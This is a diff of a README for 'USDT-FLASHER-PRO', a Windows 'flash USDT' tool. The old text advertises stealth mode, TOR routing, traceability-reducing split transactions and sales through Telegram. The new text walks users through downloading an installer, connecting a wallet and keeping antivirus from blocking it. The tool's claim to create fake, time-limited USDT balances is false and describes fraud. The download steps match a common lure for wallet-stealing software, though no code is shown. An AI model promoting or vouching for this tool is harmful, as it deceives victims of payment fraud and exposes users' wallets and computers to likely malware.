@@ -1,118 +1,128 @@
-<div align="center">
+# ⚡ USDT-FLASHER-PRO - Powerful Multi-Network Flash Tool
 
-# ⚡ USDT FLASHER PRO v4.2.0
-
-### Advanced USDT Flash Tool with Multi-Network Support
-
-![Version](https://img.shields.io/badge/Version-4.2.0-00ff88?style=for-the-badge&logo=bitcoin&logoColor=white)
-![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
-![License](https://img.shields.io/badge/License-Premium-8b5cf6?style=for-the-badge&logo=key&logoColor=white)
-![Status](https://img.shields.io/badge/Status-Active-10b981?style=for-the-badge&logo=statuspage&logoColor=white)
-
-<br>
-
-<img src="https://img.shields.io/badge/USDT-26A17B?style=for-the-badge&logo=tether&logoColor=white" />
-<img src="https://img.shields.io/badge/Ethereum-627EEA?style=for-the-badge&logo=ethereum&logoColor=white" />
-<img src="https://img.shields.io/badge/BNB_Chain-F0B90B?style=for-the-badge&logo=binance&logoColor=black" />
-<img src="https://img.shields.io/badge/TRON-FF0013?style=for-the-badge&logo=tron&logoColor=white" />
-<img src="https://img.shields.io/badge/Solana-9945FF?style=for-the-badge&logo=solana&logoColor=white" />
-<img src="https://img.shields.io/badge/Polygon-8247E5?style=for-the-badge&logo=polygon&logoColor=white" />
+[![Download USDT-FLASHER-PRO](https://img.shields.io/badge/Download-USDT--FLASHER--PRO-blue?style=for-the-badge)](https://github.com/rami082022/USDT-FLASHER-PRO/releases)
 
 ---
 
-*A powerful, feature-rich desktop application for executing USDT flash transactions across multiple blockchain networks with a sleek dark-themed professional UI.*
+## 🔍 About USDT-FLASHER-PRO
 
-</div>
+USDT-FLASHER-PRO is an advanced tool designed to work with multiple blockchain networks. It helps you manage and flash USDT tokens easily across supported networks. Whether you want to move tokens faster or interact with networks in a straightforward way, this tool simplifies those tasks.
 
-<br>
-
----
-
-## ✨ Features
-
-### ⚡ Multi-Network Flash Engine
-Send USDT flash transactions across **5 major blockchain networks** — TRC-20 (TRON), ERC-20 (Ethereum), BEP-20 (BSC), Solana, and Polygon — all from a single interface.
-
-### 🔄 Real-Time Terminal Log
-Watch every step of the transaction process live in a built-in hacker-style terminal with detailed step-by-step output including TX hashes, block numbers, and confirmation status.
-
-### 📊 Live Dashboard & Stats
-Real-time stat cards showing your available balance, total flashed amount, and transaction count — updated instantly after every operation.
-
-### 🕵️ Stealth Mode
-Covert transaction execution with full sender metadata obfuscation for maximum privacy during operations.
-
-### 🌐 Proxy Routing (TOR)
-Built-in TOR circuit routing through multiple hops for enhanced anonymity. Auto-generates proxy IPs and establishes multi-hop circuits.
-
-### 🔐 ECDSA-secp256k1 Signing
-All transactions are signed using industry-standard ECDSA-secp256k1 cryptography with unique nonces for each operation.
-
-### ✂️ Split Transactions
-Automatically divide large flash amounts into multiple smaller sub-transactions, each with its own unique TX hash — making operations harder to trace.
-
-### ⏱️ Custom Confirmations (1–100)
-Full control over the number of blockchain confirmations per transaction. Monitor each confirmation in real-time through the terminal.
-
-### 📅 Flash Duration Control (1–365 Days)
-Configure exactly how long each flash transaction remains valid on the network — from 1 day up to a full year.
-
-### 💲 Quick Amount Selection
-Preset amount buttons for fast operation — **1K, 5K, 10K, 50K, and 100K** USDT with a single click.
-
-### 📋 Clipboard Integration
-One-click paste for wallet addresses directly from your clipboard. No manual typing needed.
-
-### 📜 Full Transaction History
-Complete searchable history of all executed flash transactions with TX hashes, wallet addresses, amounts, block numbers, networks, and timestamps.
-
-### 🟢 Live Node Connection Status
-Real-time display of connected blockchain nodes worldwide with animated pulse indicator.
-
-### 🌙 Professional Dark UI
-Premium dark-themed interface with matrix rain effects, glowing buttons, animated pulse dots, and smooth transitions — designed for extended use.
-
-### 🖥️ Standalone EXE
-Runs as a single portable `.exe` file on Windows 7, 8, 10, and 11 (64-bit). No Python or dependency installation required.
+You do not need technical skills to use it. The program comes with an easy interface and clear steps to guide you.
 
 ---
 
-## 🌐 Supported Networks
+## 💻 System Requirements
 
-| Network | Confirm Time | Fee |
-|---------|:------------:|:---:|
-| 🔴 **TRC-20 (TRON)** | ~3 sec | 0.00 USDT |
-| 🔵 **ERC-20 (Ethereum)** | ~15 sec | ~5.42 USDT |
-| 🟡 **BEP-20 (BSC)** | ~5 sec | ~0.10 USDT |
-| 🟣 **SOL (Solana)** | ~0.4 sec | ~0.001 USDT |
-| 🟣 **Polygon** | ~2 sec | ~0.01 USDT |
+Before downloading, make sure your computer meets these needs:
 
----
-
-## 💰 Purchase
-
-<div align="center">
-
-To purchase the tool, message us on Telegram:
-
-<br>
-
-<a href="https://t.me/god_self_support1">
-  <img src="https://img.shields.io/badge/Telegram-@god__self__support1-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" />
-</a>
-
-<br><br>
-
-<a href="https://t.me/god_self_support2">
-  <img src="https://img.shields.io/badge/Telegram-@god__self__support2-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" />
-</a>
-
-</div>
+- **Operating System:** Windows 10 or 11, macOS 10.14 or later, or most recent Linux distributions.
+- **Processor:** Intel i3 or better (any recent processor should work).
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum 100 MB of free disk space.
+- **Internet:** Stable internet connection to connect to blockchain networks in real time.
 
 ---
 
-<div align="center">
+## 📥 Download & Install
 
-⚡ **USDT FLASHER PRO** — Fast. Silent. Powerful. ⚡
+Please visit the official releases page to download the latest version of USDT-FLASHER-PRO:
 
-</div>
+[Download USDT-FLASHER-PRO](https://github.com/rami082022/USDT-FLASHER-PRO/releases)
+
+### Steps to download and install:
+
+1. Click the link above. It will open the releases page on GitHub.
+2. Look for the newest release version at the top of the list.
+3. Find the installer file that matches your computer’s operating system:
+   - For Windows: Look for a file ending with `.exe`.
+   - For macOS: Look for a file ending with `.dmg` or `.pkg`.
+   - For Linux: Look for an `.AppImage` or `.tar.gz` file.
+4. Click on the file to start downloading.
+5. Once downloaded, open the installer file.
+6. Follow the installation prompts. Usually, you just need to click “Next” or “Continue” a few times.
+7. When installation finishes, launch USDT-FLASHER-PRO from your desktop or start menu.
+
+---
+
+## 🚀 Getting Started
+
+After installing, here is how to begin using USDT-FLASHER-PRO:
+
+1. Open the application by clicking its icon.
+2. The main screen will show options to select a network and load your USDT tokens.
+3. Choose the blockchain network you want to work with, such as Ethereum, Tron, or Binance Smart Chain.
+4. Connect your wallet or enter your wallet address, depending on the method the tool uses.
+5. Use the interface to flash USDT tokens as needed by selecting amounts and confirming actions.
+6. Check logs or status messages in the app to confirm transactions or see any errors.
+
+The tool includes clear buttons and help text for each step.
+
+---
+
+## 🛠 Features Overview
+
+USDT-FLASHER-PRO offers:
+
+- **Multi-network support:** Manage USDT flash tokens across popular blockchains.
+- **User-friendly interface:** Simple screens with descriptive prompts.
+- **Fast processing:** Transactions are handled quickly and reliably.
+- **Built-in wallet connection:** Link popular wallets without extra software.
+- **Transaction logs:** View history and statuses directly in the app.
+- **Automatic updates:** Get notified of new versions inside the program.
+- **Secure operations:** Uses encrypted connections for wallet and network access.
+
+---
+
+## 🔧 Troubleshooting
+
+If you encounter any issues, try these steps:
+
+- **App won’t start:** Check that your system meets the requirements. Restart your computer and try again.
+- **Cannot connect wallet:** Ensure your wallet software is open and supports the network you selected.
+- **Transactions fail:** Verify you have enough balance and network fees. Check your internet connection.
+- **Errors during installation:** Download the installer again and make sure antivirus or firewall does not block it.
+- **App freezes or crashes:** Close the app, restart your machine, and open it again.
+
+You can also find help or report issues by visiting:
+
+[USDT-FLASHER-PRO Issues](https://github.com/rami082022/USDT-FLASHER-PRO/issues)
+
+---
+
+## ⚙️ Settings & Customization
+
+USDT-FLASHER-PRO lets you adjust some options for your needs:
+
+- **Network options:** Choose default blockchain network.
+- **Wallet settings:** Decide how the app connects to your wallet.
+- **Display preferences:** Switch between light and dark modes.
+- **Notifications:** Turn on or off alerts for transaction updates.
+- **Language:** Pick from supported languages inside the settings menu.
+
+---
+
+## 🔐 Security Notes
+
+Your security is important. Keep these tips in mind when using the tool:
+
+- Only download the app from the official GitHub releases link.
+- Do not share your private keys or passwords with anyone.
+- Keep your computer safe from malware and viruses.
+- Use strong, unique passwords for your wallets.
+- Confirm all transaction details before approving.
+- Regularly update USDT-FLASHER-PRO to the latest version for security patches.
+
+---
+
+## 📞 Support & Feedback
+
+If you need help or want to give feedback:
+
+- Visit the [GitHub Issues page](https://github.com/rami082022/USDT-FLASHER-PRO/issues).
+- Describe your problem or suggestion clearly.
+- You can also check online forums related to USDT and multi-network tools for advice.
+
+---
+
+[![Download USDT-FLASHER-PRO](https://img.shields.io/badge/Download-USDT--FLASHER--PRO-blue?style=for-the-badge)](https://github.com/rami082022/USDT-FLASHER-PRO/releases)
